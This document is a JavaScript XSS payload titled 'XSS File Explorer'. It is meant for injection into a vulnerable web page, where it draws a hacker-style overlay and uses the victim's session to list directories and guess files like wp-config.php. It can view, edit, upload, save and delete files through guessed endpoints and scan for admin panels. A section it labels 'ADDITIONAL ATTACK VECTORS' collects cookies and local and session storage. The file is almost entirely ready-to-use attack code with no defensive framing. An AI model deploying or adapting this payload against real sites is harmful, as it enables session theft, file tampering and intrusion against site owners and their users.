document.write(`
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
background:#1a1a1a;border:3px solid #00ff00;padding:20px;z-index:999999;
width:700px;height:500px;font-family:monospace;color:#00ff00;box-shadow:0 0 30px #000;
display:flex;flex-direction:column;">

    <div style="display:flex;justify-content:space-between;margin-bottom:10px;">
        <h2 style="margin:0;">📁 XSS File Explorer</h2>
        <button onclick="this.parentElement.parentElement.style.display='none'" 
                style="background:#ff0000;color:#fff;border:none;padding:5px 10px;cursor:pointer;">✖</button>
    </div>
    
    <!-- Current path -->
    <div style="background:#000;padding:8px;margin:5px 0;border:1px solid #0f0;">
        📂 Current: <span id="currentPath">/</span>
    </div>
    
    <!-- Navigation buttons -->
    <div style="display:flex;gap:5px;margin:5px 0;">
        <button onclick="listDirectory('/')" style="background:#0f0;color:#000;padding:5px;flex:1;">🏠 Root</button>
        <button onclick="goUp()" style="background:#0f0;color:#000;padding:5px;flex:1;">⬆️ Parent</button>
        <button onclick="listCurrent()" style="background:#0f0;color:#000;padding:5px;flex:1;">🔄 Refresh</button>
    </div>
    
    <!-- Path input -->
    <div style="display:flex;gap:5px;margin:5px 0;">
        <input id="pathInput" placeholder="Enter path (/var/www/html)" style="flex:3;background:#333;color:#0f0;border:1px solid #0f0;padding:5px;">
        <button onclick="goToPath()" style="flex:1;background:#0f0;color:#000;">Go</button>
    </div>
    
    <!-- File list with scroll -->
    <div style="flex:1;overflow:auto;background:#000;border:1px solid #0f0;padding:5px;margin:5px 0;">
        <table style="width:100%;border-collapse:collapse;">
            <thead>
                <tr style="border-bottom:1px solid #0f0;">
                    <th style="text-align:left;padding:5px;">Type</th>
                    <th style="text-align:left;padding:5px;">Name</th>
                    <th style="text-align:right;padding:5px;">Size</th>
                    <th style="text-align:right;padding:5px;">Permissions</th>
                    <th style="text-align:center;padding:5px;">Actions</th>
                </tr>
            </thead>
            <tbody id="fileList">
                <tr><td colspan="5" style="text-align:center;padding:20px;">Loading...</td></tr>
            </tbody>
        </table>
    </div>
    
    <!-- Action buttons -->
    <div style="display:flex;gap:5px;margin-top:5px;">
        <button onclick="showFileUploader()" style="background:#ffaa00;color:#000;padding:5px;flex:1;">📤 Upload File</button>
        <button onclick="createFile()" style="background:#00aaff;color:#000;padding:5px;flex:1;">📝 Create File</button>
        <button onclick="createFolder()" style="background:#aa00ff;color:#fff;padding:5px;flex:1;">📁 Create Folder</button>
    </div>
    
    <!-- File viewer/editor (hidden by default) -->
    <div id="fileViewer" style="display:none;background:#000;border:1px solid #0f0;margin-top:5px;padding:5px;">
        <div style="display:flex;justify-content:space-between;">
            <span id="viewerTitle"></span>
            <button onclick="closeViewer()" style="background:#ff0000;color:#fff;border:none;">✖</button>
        </div>
        <textarea id="fileContent" style="width:100%;height:150px;background:#333;color:#0f0;border:1px solid #0f0;margin:5px 0;"></textarea>
        <button onclick="saveFile()" style="background:#0f0;color:#000;padding:5px;">💾 Save</button>
    </div>
    
    <!-- Uploader (hidden by default) -->
    <div id="uploader" style="display:none;background:#000;border:1px solid #0f0;margin-top:5px;padding:10px;">
        <div style="display:flex;justify-content:space-between;">
            <span>📤 Upload to: <span id="uploadPath">/</span></span>
            <button onclick="closeUploader()" style="background:#ff0000;color:#fff;">✖</button>
        </div>
        <input type="file" id="uploadFile" style="margin:10px 0;width:100%;">
        <button onclick="uploadFile()" style="background:#0f0;color:#000;padding:5px;width:100%;">Upload</button>
    </div>
    
    <!-- Status bar -->
    <div id="statusBar" style="background:#000;padding:5px;margin-top:5px;font-size:11px;color:#aaa;"></div>
</div>
`);

// Current directory
let currentDir = '/';
let baseUrl = window.location.origin;

// ==================== DIRECTORY LISTING METHODS ====================

// Try different methods to list directory
window.listDirectory = function(path) {
    path = path || currentDir;
    currentDir = path;
    document.getElementById('currentPath').innerText = path;
    document.getElementById('fileList').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:20px;">Loading...</td></tr>';
    
    // Try multiple methods to get directory listing
    tryMethod1(path);
};

// Method 1: Try common directory listing endpoints
function tryMethod1(path) {
    const status = document.getElementById('statusBar');
    status.innerText = 'Trying directory listing methods...';
    
    const methods = [
        // Try Apache autoindex
        { url: path + '?C=M;O=D', type: 'apache' },
        // Try Nginx autoindex
        { url: path, type: 'nginx' },
        // Try with trailing slash
        { url: path + '/', type: 'slash' },
        // Try common index files
        { url: path + 'index.php?dir=' + encodeURIComponent(path), type: 'php' },
        { url: path + 'list.php?dir=' + encodeURIComponent(path), type: 'list' },
        // Try JSON endpoints
        { url: path + 'api/list?dir=' + encodeURIComponent(path), type: 'json' },
        { url: '/list.php?dir=' + encodeURIComponent(path), type: 'root_list' }
    ];
    
    let methodIndex = 0;
    
    function tryNext() {
        if(methodIndex >= methods.length) {
            // If all methods fail, try JavaScript file object enumeration
            enumerateJSObjects(path);
            return;
        }
        
        const method = methods[methodIndex];
        status.innerText = `Trying method ${methodIndex + 1}/${methods.length}: ${method.type}...`;
        
        fetch(method.url, { 
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
            cache: 'no-cache'
        })
        .then(response => response.text())
        .then(html => {
            // Parse different response types
            if(parseListing(html, method.type, path)) {
                status.innerText = `✅ Found listing via ${method.type}`;
            } else {
                methodIndex++;
                tryNext();
            }
        })
        .catch(() => {
            methodIndex++;
            tryNext();
        });
    }
    
    tryNext();
}

// Parse different listing formats
function parseListing(html, type, path) {
    const files = [];
    
    switch(type) {
        case 'apache':
        case 'nginx':
            // Parse Apache/Nginx autoindex
            const regex = /<a href="([^"]+)">([^<]+)<\/a>\s+(\d{2}-\w{3}-\d{4}|\d{4}-\d{2}-\d{2}).*?(\d+[KMG]?|\-)/gi;
            let match;
            while((match = regex.exec(html)) !== null) {
                if(match[2] !== '../' && match[2] !== 'Parent Directory') {
                    files.push({
                        name: match[2].replace(/\/$/, ''),
                        type: match[2].endsWith('/') ? 'dir' : 'file',
                        size: match[4] || '-',
                        date: match[3] || '',
                        url: match[1]
                    });
                }
            }
            break;
            
        case 'json':
            // Try to parse as JSON
            try {
                const data = JSON.parse(html);
                if(Array.isArray(data)) {
                    data.forEach(item => {
                        files.push({
                            name: item.name || item.filename || '',
                            type: item.type || (item.is_dir ? 'dir' : 'file'),
                            size: item.size || '-',
                            perms: item.permissions || '',
                            url: item.url || item.path || ''
                        });
                    });
                }
            } catch(e) {}
            break;
    }
    
    if(files.length > 0) {
        displayFiles(files, path);
        return true;
    }
    return false;
}

// Method 2: Enumerate JavaScript objects
function enumerateJSObjects(path) {
    const files = [];
    const status = document.getElementById('statusBar');
    
    status.innerText = 'Trying JavaScript object enumeration...';
    
    // Try to find file objects in JavaScript
    for(let key in window) {
        try {
            if(key.includes('file') || key.includes('File') || key.includes('upload')) {
                files.push({
                    name: key,
                    type: 'object',
                    size: 'JS',
                    perms: '---',
                    isJS: true
                });
            }
        } catch(e) {}
    }
    
    // Try to find from DOM
    document.querySelectorAll('a[href], img[src], script[src], link[href]').forEach(el => {
        const src = el.href || el.src;
        if(src && src.includes(path)) {
            files.push({
                name: src.split('/').pop(),
                type: 'file',
                size: 'DOM',
                perms: '---',
                url: src,
                isDOM: true
            });
        }
    });
    
    if(files.length > 0) {
        displayFiles(files, path);
        status.innerText = `✅ Found ${files.length} items via enumeration`;
    } else {
        // Method 3: Try to guess common files
        guessCommonFiles(path);
    }
}

// Method 3: Guess common files
function guessCommonFiles(path) {
    const commonFiles = [
        'index.php', 'index.html', 'config.php', 'wp-config.php',
        '.htaccess', 'phpinfo.php', 'upload.php', 'admin.php',
        'login.php', 'db.php', 'database.php', 'settings.php'
    ];
    
    const files = [];
    const status = document.getElementById('statusBar');
    
    status.innerText = 'Testing common filenames...';
    
    commonFiles.forEach(filename => {
        files.push({
            name: filename,
            type: 'guess',
            size: '?',
            perms: '---',
            url: path + filename,
            isGuess: true
        });
    });
    
    displayFiles(files, path);
    status.innerText = '⚠️ Showing guessed files (click to test if they exist)';
}

// Display files in table
function displayFiles(files, path) {
    let html = '';
    
    // Add parent directory link
    if(path !== '/') {
        const parent = path.split('/').slice(0, -1).join('/') || '/';
        html += `<tr style="border-bottom:1px solid #333;">
            <td>📁</td>
            <td><a href="#" onclick="listDirectory('${parent}');return false;" style="color:#0f0;">..</a></td>
            <td align="right">-</td>
            <td align="right">---</td>
            <td align="center">⬆️</td>
        </tr>`;
    }
    
    files.forEach(file => {
        const isDir = file.type === 'dir' || file.name.endsWith('/');
        const icon = isDir ? '📁' : (file.name.match(/\.(jpg|png|gif)$/i) ? '🖼️' : 
                   (file.name.match(/\.(php|js|html)$/i) ? '📄' : '📄'));
        
        html += `<tr style="border-bottom:1px solid #333;">
            <td>${icon}</td>
            <td>
                ${isDir ? 
                    `<a href="#" onclick="listDirectory('${path}${file.name}');return false;" style="color:#0f0;">${file.name}</a>` :
                    `<a href="#" onclick="viewFile('${path}${file.name}');return false;" style="color:#0f0;">${file.name}</a>`
                }
            </td>
            <td align="right">${file.size || '-'}</td>
            <td align="right">${file.perms || '---'}</td>
            <td align="center">
                ${!isDir ? `
                    <button onclick="viewFile('${path}${file.name}')" style="background:none;border:none;color:#0f0;cursor:pointer;">👁️</button>
                    <button onclick="downloadFile('${path}${file.name}')" style="background:none;border:none;color:#0f0;cursor:pointer;">⬇️</button>
                    <button onclick="deleteFile('${path}${file.name}')" style="background:none;border:none;color:#ff0000;cursor:pointer;">🗑️</button>
                ` : '📁'}
            </td>
        </tr>`;
    });
    
    document.getElementById('fileList').innerHTML = html;
}

// ==================== FILE OPERATIONS ====================

// View file
window.viewFile = function(filepath) {
    const viewer = document.getElementById('fileViewer');
    const title = document.getElementById('viewerTitle');
    const content = document.getElementById('fileContent');
    
    title.innerText = `📄 Viewing: ${filepath}`;
    viewer.style.display = 'block';
    content.value = 'Loading...';
    content.readOnly = true;
    
    // Try to fetch file
    fetch(filepath)
        .then(response => response.text())
        .then(text => {
            content.value = text;
            content.readOnly = false;
        })
        .catch(() => {
            content.value = '❌ Cannot read file (cross-origin or permission denied)';
        });
};

// Download file
window.downloadFile = function(filepath) {
    const a = document.createElement('a');
    a.href = filepath;
    a.download = filepath.split('/').pop();
    a.click();
};

// Delete file
window.deleteFile = function(filepath) {
    if(confirm(`Delete ${filepath}?`)) {
        // Try common delete endpoints
        const deleteUrls = [
            '/delete.php?file=' + encodeURIComponent(filepath),
            '/admin/delete.php?path=' + encodeURIComponent(filepath),
            '/filemanager/delete.php?file=' + encodeURIComponent(filepath)
        ];
        
        deleteUrls.forEach(url => {
            fetch(url, { method: 'POST' })
                .then(() => alert('Delete attempted - check if successful'));
        });
    }
};

// Save file
window.saveFile = function() {
    const path = document.getElementById('viewerTitle').innerText.replace('📄 Viewing: ', '');
    const content = document.getElementById('fileContent').value;
    
    // Try to save via various methods
    const formData = new FormData();
    formData.append('file', new Blob([content]), path.split('/').pop());
    formData.append('path', path);
    formData.append('content', content);
    
    fetch('/save.php', {
        method: 'POST',
        body: formData
    })
    .then(() => alert('Save attempted'));
};

// Upload file
window.uploadFile = function() {
    const file = document.getElementById('uploadFile').files[0];
    const path = document.getElementById('uploadPath').innerText;
    
    if(!file) {
        alert('Select a file');
        return;
    }
    
    const formData = new FormData();
    formData.append('file', file);
    formData.append('path', path);
    
    fetch('/upload.php', {
        method: 'POST',
        body: formData
    })
    .then(() => {
        alert('Upload attempted');
        closeUploader();
        listCurrent();
    });
};

// Create file
window.createFile = function() {
    const filename = prompt('Enter filename:');
    if(filename) {
        const path = currentDir + filename;
        const viewer = document.getElementById('fileViewer');
        document.getElementById('viewerTitle').innerText = `📄 Creating: ${path}`;
        document.getElementById('fileContent').value = '';
        document.getElementById('fileContent').readOnly = false;
        viewer.style.display = 'block';
    }
};

// Create folder
window.createFolder = function() {
    const foldername = prompt('Enter folder name:');
    if(foldername) {
        const formData = new FormData();
        formData.append('folder', foldername);
        formData.append('path', currentDir);
        
        fetch('/mkdir.php', {
            method: 'POST',
            body: formData
        })
        .then(() => alert('Folder creation attempted'));
    }
};

// ==================== NAVIGATION ====================

window.goUp = function() {
    if(currentDir !== '/') {
        const parent = currentDir.split('/').slice(0, -1).join('/') || '/';
        listDirectory(parent);
    }
};

window.listCurrent = function() {
    listDirectory(currentDir);
};

window.goToPath = function() {
    const path = document.getElementById('pathInput').value;
    if(path) {
        listDirectory(path);
    }
};

// ==================== UI HELPERS ====================

window.showFileUploader = function() {
    document.getElementById('uploadPath').innerText = currentDir;
    document.getElementById('uploader').style.display = 'block';
};

window.closeUploader = function() {
    document.getElementById('uploader').style.display = 'none';
};

window.closeViewer = function() {
    document.getElementById('fileViewer').style.display = 'none';
};

// ==================== ADDITIONAL ATTACK VECTORS ====================

// Try to get PHP info
window.getPHPInfo = function() {
    fetch('/phpinfo.php')
        .then(r => r.text())
        .then(text => {
            document.getElementById('fileContent').value = text;
            document.getElementById('viewerTitle').innerText = 'PHP Info';
            document.getElementById('fileViewer').style.display = 'block';
        });
};

// Try to get server environment
window.getEnv = function() {
    const env = {
        url: window.location.href,
        origin: window.location.origin,
        cookies: document.cookie,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
    };
    
    document.getElementById('fileContent').value = JSON.stringify(env, null, 2);
    document.getElementById('viewerTitle').innerText = 'Environment Info';
    document.getElementById('fileViewer').style.display = 'block';
};

// Try common admin paths
window.scanAdminPaths = function() {
    const adminPaths = [
        '/admin', '/administrator', '/wp-admin', '/manager',
        '/phpmyadmin', '/pma', '/adminer', '/panel', '/cpanel'
    ];
    
    const results = [];
    adminPaths.forEach(path => {
        fetch(path)
            .then(r => {
                if(r.status === 200) {
                    results.push(`✅ ${path} - accessible`);
                }
            })
            .catch(() => {});
    });
    
    setTimeout(() => {
        document.getElementById('fileContent').value = results.join('\n');
        document.getElementById('viewerTitle').innerText = 'Admin Path Scan';
        document.getElementById('fileViewer').style.display = 'block';
    }, 2000);
};

// Initialize
setTimeout(() => {
    listDirectory('/');
    // Add extra buttons
    const actions = document.querySelector('div[style*="display:flex;gap:5px;margin-top:5px;"]');
    actions.innerHTML += `
        <button onclick="getPHPInfo()" style="background:#ff66aa;color:#000;padding:5px;flex:1;">ℹ️ PHP Info</button>
        <button onclick="getEnv()" style="background:#66ffaa;color:#000;padding:5px;flex:1;">🌐 Environment</button>
        <button onclick="scanAdminPaths()" style="background:#aa66ff;color:#fff;padding:5px;flex:1;">🔍 Admin Scan</button>
    `;
}, 100);
